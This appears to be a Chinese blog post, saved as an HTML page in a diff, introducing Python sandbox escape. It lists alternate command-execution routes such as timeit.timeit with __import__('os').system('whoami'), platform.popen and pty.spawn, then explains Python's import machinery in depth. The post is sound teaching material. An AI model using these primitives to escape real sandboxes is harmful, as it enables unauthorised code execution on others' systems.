@@ -1,0 +1,1899 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    <meta name="keywords" content="初探python沙箱逃逸, yyjccc的博客">
+    <meta name="description" content="初探python沙箱逃逸为了不让恶意用户执行任意的 Python 代码，就需要确保 Python 运行在沙箱中。沙箱经常会禁用一些敏感的函数和模块，例如 os
+沙箱逃逸就是绕过某些函数，特殊字符串，或模块的限制，达到一个漏洞环境
+基础知识命">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>初探python沙箱逃逸 | yyjccc的博客</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+    <style>
+        body{
+            background-image: url(https://cdn.jsdelivr.net/gh/Tokisaki-Galaxy/res/site/medias/background.jpg);
+            background-repeat:no-repeat;
+            background-size: 100% 100%;
+            background-attachment:fixed;
+        }
+    </style>
+
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+    <body>
+        <!-- hexo-inject:begin --><!-- hexo-inject:end --><header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">yyjccc的博客</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">yyjccc的博客</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/Yyjccc" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/Yyjccc" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+            
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">初探python沙箱逃逸</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">web安全</span>
+                            </a>
+                        
+                            <a href="/tags/python%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">python安全</span>
+                            </a>
+                        
+                            <a href="/tags/%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0/">
+                                <span class="chip bg-color">进阶学习</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2023-08-28
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
+
+        
+        <!-- 代码块折行 -->
+        <style type="text/css">
+            code[class*="language-"], pre[class*="language-"] { white-space: pre-wrap !important; }
+        </style>
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="初探python沙箱逃逸"><a href="#初探python沙箱逃逸" class="headerlink" title="初探python沙箱逃逸"></a>初探python沙箱逃逸</h1><p>为了不让恶意用户执行任意的 Python 代码，就需要确保 Python 运行在沙箱中。沙箱经常会禁用一些敏感的函数和模块，例如 os</p>
+<p>沙箱逃逸就是绕过某些函数，特殊字符串，或模块的限制，达到一个漏洞环境</p>
+<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a><strong>基础知识</strong></h1><h3 id="命令执行函数与模块"><a href="#命令执行函数与模块" class="headerlink" title="命令执行函数与模块"></a>命令执行函数与模块</h3><p>在 Python 中执行系统命令的方式有：</p>
+<ul>
+<li>os：<code>system</code>,<code>popen</code></li>
+<li>commands：(仅限<code>2.x</code>)<code>getstatusoutput</code>,<code>getoutput</code></li>
+<li>subprocess: <code>getstatusoutput</code>,<code>getoutput</code></li>
+<li>timeit：<code>timeit.sys</code>、<code>timeit.timeit("__import__('os').system('whoami')", number=1)</code></li>
+<li>platform：<code>platform.os</code>、<code>platform.sys</code>、<code>platform.popen('whoami', mode='r', bufsize=-1).read()</code></li>
+<li>pty：<code>pty.spawn('ls')</code>、<code>pty.os</code></li>
+<li>bdb：<code>bdb.os</code>、<code>cgi.sys</code></li>
+<li>cgi：<code>cgi.os</code>、<code>cgi.sys</code></li>
+</ul>
+<pre class="language-none"><code class="language-none">print(os.system('whoami'))
+print(os.popen('whoami').read()) 
+print(os.popen2('whoami').read()) # 2.x
+print(os.popen3('whoami').read()) # 2.x
+print(os.popen4('whoami').read()) # 2.x
+...</code></pre>
+
+
+
+<h2 id="Python-import机制"><a href="#Python-import机制" class="headerlink" title="Python import机制"></a>Python import机制</h2><p>具体细节参考官方文档</p>
+<h3 id="模块-module-与-包-package"><a href="#模块-module-与-包-package" class="headerlink" title="模块 module 与 包 package"></a><strong>模块 module 与 包 package</strong></h3><p>模块–</p>
+<p>一个 <em>.py</em> 后缀文件即是 Python 的一个模块。在模块的内部，可以通过全局变量 <code>__name__</code> 来获得模块名。模块可以包含可执行的语句，这些语句会在模块 <strong>初始化</strong> 的时候执行 —— 当所在模块被 <code>import</code> 导入时它们有且只会执行一次。</p>
+<p>包–</p>
+<p>目前的 Python 实际上是有两种包的存在：<strong>正规包</strong>（<em>regular Package</em>） 以及 <strong>命名空间包</strong>（<em>Namespace package</em>）。</p>
+<blockquote>
+<p>要注意的是，Python 的 package 实际上都是特殊的 module ：可以通过导入 package 之后查看 <code>globals()</code> 可知；实际上，任何带有 <strong>path</strong> 属性的对象都会被 Python 视作 package 。</p>
+</blockquote>
+<ul>
+<li>正规包： 在 Python 3.2 之前就已经存在了的，通常是以包含一个 <code>__init__.py</code> 文件的目录形式展现。当 package 被导入时，这个 <code>__init__.py</code> 文件会被 <em>隐式</em> 地执行。</li>
+<li>命名空间包： 根据 PEP420 的定义，命名空间包是由多个 <em>portion</em> 组成的 —— <em>portion</em> 类似于父包下的子包，但它们物理位置上不一定相邻，而且它们可能表现为 .zip 中的文件、网络上的文件等等。命名空间包不需要 <code>__init__.py</code> 文件，只要它本身或者子包（也就是 <em>portion</em>）被导入时，Python 就会给顶级的部分创建为命名空间包 —— 因此，命名空间包不一定直接对应到文件系统中的对象，它可以是一个 <em>虚拟</em> 的 module 。</li>
+</ul>
+<h2 id="import导包"><a href="#import导包" class="headerlink" title="import导包"></a>import导包</h2><p>import就是将python文件转化为一个python对象–module 的一个操作</p>
+<p>模块中的 Python 代码可以通过 import（导入）操作访问另一个模块内的代码。<code>import</code> 语句时调起导入机制的常用方式，但不是唯一方式。<code>importlib.import_module()</code> 以及内置的 <code>__import__()</code> 函数都可以调起导入机制。</p>
+<p><code>import</code> 语句实际上结合了两个操作：</p>
+<ol>
+<li>搜索操作：根据指定的命名查找模块</li>
+<li>绑定操作：将搜索的结果绑定到当前作用域对应的命名上</li>
+</ol>
+<p><code>import</code> 的 search 操作实际上是带参调用 <code>__import__()</code> 函数，而函数的返回值会用在 <code>import</code> 语句的绑定操作上。</p>
+<p>直接调用 <code>__import__()</code> 只会执行模块查找，以及如果找到的话就创建模块。这会有一定的副作用，比如导入父包和更新各式各样的缓存（包括 <code>sys.modules</code>），而且绑定操作只有 <code>import</code> 语句才会做得到。</p>
+<blockquote>
+<p>其他调起导入机制的行为（比如 <code>importlib.import_module()</code>）有可能会绕过 <code>__import__()</code> 并使用自定义的方法来实现导入。</p>
+</blockquote>
+<p>当一个模块被首次导入时，Python 会搜索该模块，如果找到就创建一个 <code>module</code> 对象并初始化；如果未找到则抛出 <code>ModuleNotFoundError</code> 异常。至于如何找到这些模块，Python 定义了多种的 <strong>搜索策略</strong> （search strategy），而这些策略可以通过 <code>importlib</code> 等提供的各类 hook 来修改和扩展。</p>
+<blockquote>
+<p>根据 Python 3.3 的 changlog 可知目前导入系统已完全实现了 PEP302 的提案，所有的导入机制都会通过 <code>sys.meta_path</code> 暴露出来，不会再有任何隐式的导入机制。</p>
+</blockquote>
+<h2 id="import搜索机制"><a href="#import搜索机制" class="headerlink" title="import搜索机制"></a>import搜索机制</h2><h4 id="模块搜索路径"><a href="#模块搜索路径" class="headerlink" title="模块搜索路径"></a><strong>模块搜索路径</strong></h4><p>当我们要导入一个模块（比如 <code>foo</code> ）时，解释器首先会根据命名查找内置模块，如果没有找到，它就会去查找 <code>sys.path</code> 列表中的目录，看目录中是否有 <em>foo.py</em> 。<code>sys.path</code> 的初始值来自于：</p>
+<ul>
+<li>运行脚本所在的目录（如果打开的是交互式解释器则是当前目录）</li>
+<li><code>PYTHONPATH</code> 环境变量（类似于 <code>PATH</code> 变量，也是一组目录名组成）</li>
+<li>Python 安装时的默认设置</li>
+</ul>
+<p>为了开始搜索，Python 需要被导入模块（或者包）的完全限定名(<em>fully qualified name</em>)。这个名称可能作为 <code>import</code> 语句的参数得到，或者是从函数 <code>importlib.import_module()</code> 或 <code>__import__()</code> 的传参得到。</p>
+<h4 id="1-缓存-cache"><a href="#1-缓存-cache" class="headerlink" title="1.缓存 cache"></a>1.<strong>缓存 cache</strong></h4><p>在导入搜索开始前，会先检查 <code>sys.modules</code> </p>
+<p><code>sys.modules</code> 是一个字典，里面储存了加载过的模块信息。如果 Python 是刚启动的话，所列出的模块就是解释器在启动时自动加载的模块。有些库例如 <code>os</code> 是默认被加载进来的，但是不能直接使用（但是可以通过 <code>sys.modules</code> 来使用，例如 <code>sys.modules["os"]</code>），原因在于 sys.modules 中未经 import 加载的模块对当前空间是不可见的。</p>
+<p>它是导入系统的缓存，如果之前已经导入过 <code>foo.bar.baz</code>，则将会包含 <code>foo</code>，<code>foo.bar</code> 以及 <code>foo.bar.baz</code> 键，其对应的值为各自的 <code>module</code> 对象。</p>
+<p>导入期间，如果在 <code>sys.modules</code> 找到对应的模块名的键，则取出其值，导入完成（如果值为 <code>None</code> 则抛出 <code>ModuleNotFoundError</code> 异常）；否则就进行搜索操作。</p>
+<blockquote>
+<p><code>sys.modules</code> 是可修改的，强制赋值 <code>None</code> 会导致下一次导入该模块抛出 <code>MoudleNotFoundError</code> 异常；如果删掉该键则会让下次导入触发搜索操作。</p>
+</blockquote>
+<p>注意，如果要更新缓存，使用 <strong>删除</strong> <strong>sys.modules</strong> <strong>的键</strong> 这种做法会有副作用，因为这样回导致前后导入的同名模块的 <code>module</code> 对象不是同一个。最好的做法应该是使用 <code>importlib.reload()</code> 函数。</p>
+<h4 id="2-查找器-finder-和加载器-loader"><a href="#2-查找器-finder-和加载器-loader" class="headerlink" title="2.查找器 finder 和加载器 loader"></a>2.<strong>查找器</strong> <strong>finder</strong> <strong>和加载器</strong> <strong>loader</strong></h4><p>如果在缓存中找不到模块对象，则 Python 会根据 import 协议去查找和加载该模块进来。这个协议在 PEP320 中被提出，有两个主要的组成概念：finder 和 loader 。finder 的任务是确定能否根据已知的策略找到该名称的模块。同时实现了 finder 和 loader 接口的对象叫做 <strong>importer</strong> —— 它会在找到能够被加载的所需模块时返回自身。</p>
+<p>Python 自带了一些默认的 finder 和 importer 。其中第一个知道 <strong>如何定位内置模块</strong>，第二个知道 <strong>如何定位 frozen 模块</strong>，第三个默认的 finder 会在 <strong>import path</strong> 中查找模块（即 <code>path based finder</code>）。</p>
+<blockquote>
+<p>注意在 Python 3.4 之前 finder 会直接返回 loader 而不是 module spec，后者实际上已经包含了 loader 。</p>
+</blockquote>
+<p>我们可以打印来看一下这三个 Importer 和 Finder ：</p>
+<pre class="language-none"><code class="language-none">import sys
+import pprint
+pprint.pprint(sys.meta_path)
+# [&lt;class '_frozen_importlib.BuiltinImporter'&gt;,
+#  &lt;class '_frozen_importlib.FrozenImporter'&gt;,
+#  &lt;class '_frozen_importlib_external.PathFinder'&gt;]</code></pre>
+
+<p>finder 并不会真正加载模块。如果他能找到对应命名的模块，会返回一个 <em>module spec</em>，它实际上是 module 导入所需信息的封装，供后续导入机制使用来加载模块。</p>
+<h4 id="import-hook"><a href="#import-hook" class="headerlink" title="import hook"></a><strong>import hook</strong></h4><p>import hook 是用来扩展 import 机制的，它有两种类型</p>
+<ul>
+<li>meta hook</li>
+<li>import path hook</li>
+</ul>
+<p>meta hook 会在导入的最开始被调用（在查找缓存 <code>sys.modules</code> 之后），你可以在这里重载对 <code>sys.path</code>、frozen module甚至内置 module 的处理。只需要往 <code>sys.meta_path</code> 添加一个新的 finder 即可注册 meta_hook 。</p>
+<p>import path hook 会在 <code>sys.path</code> （或 <code>package.__path__</code>）处理时被调用，它们会负责处理 <code>sys.path</code> 中的条目。只需要往 <code>sys.path_hooks</code> 添加一个新的可调用对象即可注册 import path hook 。</p>
+<h4 id="元路径-meta-path"><a href="#元路径-meta-path" class="headerlink" title="元路径 meta_path"></a><strong>元路径 meta_path</strong></h4><p>当无法从 <code>sys.modules</code> 中找到模块时，Python 会继续搜索 <code>sys.meta_path</code> 列表，列表中的 finder 会被<strong>依次</strong>用来查询是否知道如何处理这个命名的模块。</p>
+<p>所有的 <em>meta path</em> <em>finder</em> 都必须实现 <code>find_spec</code> 方法（参考 <em>importlib.abc.MetaPathFinder.find_spec</em>），如果无法处理就返回 <code>None</code>；否则返回一个 <code>spec</code> 对象（即 <code>importlib.machinery.ModuleSpec</code> 的实例）。如果全部的 finder 都没有返回，将抛出 <code>ModuleNotFoundError</code> 异常并放弃导入。</p>
+<p><strong>find_spec(fullname, path, target=None)</strong></p>
+<p>以 foo.bar.baz 模块为例对 <code>find_spec</code> 进行说明</p>
+<p>参数说明示例fullname被导入模块的完全限定名foo.bar.bazpath供搜索使用的路径列表，对于最顶级模块，这个值为 None；对于子包，这个值为父包的 <strong>path</strong> 属性值foo.bar.__path__target用作稍后加载目标的现有模块对象，这个值仅会在重载模块时传入None</p>
+<p>对于单个导入请求可能会多次遍历 meta_path，加入示例的模块都尚未被缓存，则会在每个 finder （以 <code>mpf</code> 命名）上依次调用</p>
+<ul>
+<li>mpf.find_spec(“foo”, None, None)</li>
+<li>mpf.find_spec(“foo.bar”, foo.<strong>path</strong>, None)</li>
+<li>mpf.find_spec(“foo.bar.baz”, foo.bar.<strong>path</strong>, None)</li>
+</ul>
+<blockquote>
+<p>Python 3.4 之后 finder 的 <code>find_module()</code> 已被 <code>find_spec()</code> 所替代并弃用。</p>
+</blockquote>
+<h2 id="import加载机制"><a href="#import加载机制" class="headerlink" title="import加载机制"></a>import加载机制</h2><p>源代码</p>
+<pre class="language-none"><code class="language-none">module = None
+if spec.loader is not None and hasattr(spec.loader, 'create_module'):
+    # It is assumed 'exec_module' will also be defined on the loader.
+    # 假定 loader 中已经定义了 `exec_module` 模块
+    module = spec.loader.create_module(spec)
+if module is None:
+    module = ModuleType(spec.name)
+# The import-related module attributes get set here:
+# 和模块导入相关联的属性在这个初始化方法中被设置
+_init_module_attrs(spec, module)
+
+if spec.loader is None:
+    if spec.submodule_search_locations is not None:
+        # namespace package
+        # 倘若这个模块是命名空间包
+        sys.modules[spec.name] = module
+    else:
+        # unsupported
+        # 不支持命名空间包
+        raise ImportError
+elif not hasattr(spec.loader, 'exec_module'):
+    module = spec.loader.load_module(spec.name)
+    # Set __loader__ and __package__ if missing.
+    # 如果缺失 `__loader__` 和 `__package__` 属性则要补充
+else:
+    sys.modules[spec.name] = module
+    try:
+        spec.loader.exec_module(module)
+    except BaseException:
+        try:
+            del sys.modules[spec.name]
+        except KeyError:
+            pass
+        raise
+return sys.modules[spec.name]</code></pre>
+
+<p>以下是一些细节：</p>
+<ul>
+<li>在 loader 执行 <code>exec_module</code> 之前，需要将模块缓存在 <code>sys.modules</code> ：因为模块可能会导入自身，这样做可以防止无限递归（最坏情况）或多次加载（最好情况）。</li>
+<li>如果加载失败，那么失败的模块会从 <code>sys.modules</code> 中被移除。任何已经存在的模块或者依赖但成功加载的模块都会保留 —— 这和重载不一样，后者即使加载失败也会保留失败的模块在 <code>sys.modules</code> 中。</li>
+<li>模块的执行是加载的关键步骤，它负责填充模块的命名空间。模块执行将会全权委托给 loader ，由 loader 决定如何填充和填充什么。</li>
+<li>创建出来并传递给 <code>exec_module</code> 执行的 module 对象可能和最后被 import 的 module 对象不一样。</li>
+</ul>
+<h3 id="loader-对象"><a href="#loader-对象" class="headerlink" title="loader 对象"></a><strong>loader</strong> <strong>对象</strong></h3><p>loader 是 <code>importlib.abc.Loader</code> 的实例，负责提供最关键的加载功能：模块执行。它的 <code>exec_module()</code> 方法接受唯一一个参数 —— module 对象，它所有的返回值都会被忽略。</p>
+<p>loader 必须满足以下条件：</p>
+<ul>
+<li>如果这个 module 是一个 Python module（和内置模块以及动态加载的扩展相区分），则 loader 应该在模块的全局命名空间（<code>module.__dict__</code>）中执行模块代码。</li>
+<li>如果 loader 不能执行模块，应该抛出 <code>ImportError</code> 异常。</li>
+</ul>
+<p>Python 3.4 的两个变化：</p>
+<ol>
+<li>loader 提供 create_module() 来创建 module 对象（接受一个 module spec object 并返回 module object）。如果返回 None ，则由导入机制自行创建模块。因为 module 对象在模块执行前必须存在 sys.modules 中。</li>
+<li>load_module() 方法被 exec_module() 方法替代，为了向前兼容，如果存在 load_module() 且未实现 exec_module， 导入机制才会使用 load_module() 方法。</li>
+</ol>
+<h3 id="module-spec-对象"><a href="#module-spec-对象" class="headerlink" title="module spec 对象"></a><strong>module</strong> <strong>spec</strong> <strong>对象</strong></h3><p>module spec 主要有两个作用：</p>
+<ol>
+<li>传递 —— 可以在导入系统的不同组件，如 finder 和 loader 之间传递状态信息</li>
+<li>模板(boilerplate)构建 —— 导入机制可以根据 module spec 执行模板加载操作，没有 module spec 则 loader 需要负责完成这个工作。</li>
+</ol>
+<p>module spec 通过 module 对象的 <strong>spec</strong> 属性得以公开，可以查看 <em>ModuleSpec</em> 获取更多信息。</p>
+<pre class="language-none"><code class="language-none"> import requests
+requests.__spec__
+ModuleSpec(name='requests', loader=&lt;_frozen_importlib_external.SourceFileLoader object at 0x000002EE4EBBF7B8&gt;, origin='C:\\Python37\\lib\\site-packages\\requests\\__init__.py', submodule_search_locations=['C:\\Python37\\lib\\site-packages\\requests'])</code></pre>
+
+<p>在 <code>_init_module_attrs</code> 步骤中，导入机制会根据 module spec 填充 module 对象（这个过程发生在 loader 执行模块之前）</p>
+<table>
+<thead>
+<tr>
+<th><strong>属性</strong></th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>name</strong></td>
+<td>模块的完全限定名</td>
+</tr>
+<tr>
+<td><strong>loader</strong></td>
+<td>模块加载时使用的 loader 对象，主要是用于内省</td>
+</tr>
+<tr>
+<td><strong>package</strong></td>
+<td>取代 <code>__name__</code> 用于处理相对导入，必须设置！当导入包时，这个值和 <code>__name__</code> 相同；当导入子包时，则为其父包名；为顶级模块时，应该为空字符串</td>
+</tr>
+<tr>
+<td><strong>spec</strong></td>
+<td>导入时要使用的 module spec 对象</td>
+</tr>
+<tr>
+<td><strong>path</strong></td>
+<td>如果模块为包，则必须设置！这个值为可迭代对象，如果没有进一步用途，可以为空，否则迭代结果应该为字符串</td>
+</tr>
+<tr>
+<td><strong>file</strong></td>
+<td>可选值，只有内置模块可以不设置 <code>__file__</code> 属性</td>
+</tr>
+<tr>
+<td><strong>cached</strong></td>
+<td>为编译后字节码文件所在路径，它和 <code>__file__</code> 的存在互不影响</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>在命名空间包出来之前，如果想实现命名空间包功能，一般是在包的 <code>__init__.py</code> 中修改其 <code>__path__</code> 属性。随着 PEP420 的引入，命名空间包已经可以不需要 <code>__init__.py</code> 的这种操作了。</p>
+</blockquote>
+<h3 id="path-based-finder-基于元路径查找器"><a href="#path-based-finder-基于元路径查找器" class="headerlink" title="path-based-finder 基于元路径查找器"></a><strong>path-based-finder 基于元路径查找器</strong></h3><p>上文已经提到过，Python 默认自带了几个 meta path 的 finder ，其中之一就是 <strong>PathBasedFinder</strong> ，它负责搜索 <em>import path</em> 上的路径。</p>
+<p>这个 finder 实际上并不知道如何进行 import ，它的工作只是遍历 <em>import path</em> 上的每一个条目，将它们关联到某个知道如何处理特定类型路径的 <strong>path entry finder</strong>（路径条目查找器）。</p>
+<blockquote>
+<p>根据术语表，<strong>path entry</strong> <strong>finder</strong> 是由 <code>sys.path_hook</code> 列表中的可调用对象返回的（前提是它知道如何根据特定路径条目找到模块）。</p>
+</blockquote>
+<p>可以将 <em>PathEntryFinder</em> 看作 <em>PathBasedFinder</em> 的具体实现。实际上，如果从 <code>sys.meta_path</code> 中移除了 <em>PathBasedFinder</em> ，则不会有任何 <em>PathEntryFinder</em> 被调用。</p>
+<h3 id="path-entry-finder-路径条目查找器"><a href="#path-entry-finder-路径条目查找器" class="headerlink" title="path entry finder 路径条目查找器"></a><strong>path entry</strong> <strong>finder</strong> <strong>路径条目查找器</strong></h3><p><em>PathBasedFinder</em> 会使用到三个变量，它们会提供给自定义导入机制的额外途径，包括：</p>
+<ul>
+<li><code>sys.path</code></li>
+<li><code>sys.path_hooks</code></li>
+<li><code>sys.path_importer_cache</code></li>
+</ul>
+<blockquote>
+<p>包的 <strong>path</strong> 属性也会被使用。</p>
+</blockquote>
+<p><code>sys.path</code> 是一个字符串列表，提供了模块和包的搜索位置。它的条目可以来自于文件系统的目录、zip 文件或者其他潜在可以找到模块的“位置”（参考 <code>site</code> 模块）。</p>
+<p>由于 <em>PathBasedFinder</em> 是一个 <em>meta path</em> <em>finder</em> ，所以必须实现了 <code>find_spec()</code> 方法。导入机制会通过调用这个方法来搜索 <em>import path</em> （通过传入 <code>path</code> 参数 —— 它是一个可遍历的字符串列表）。</p>
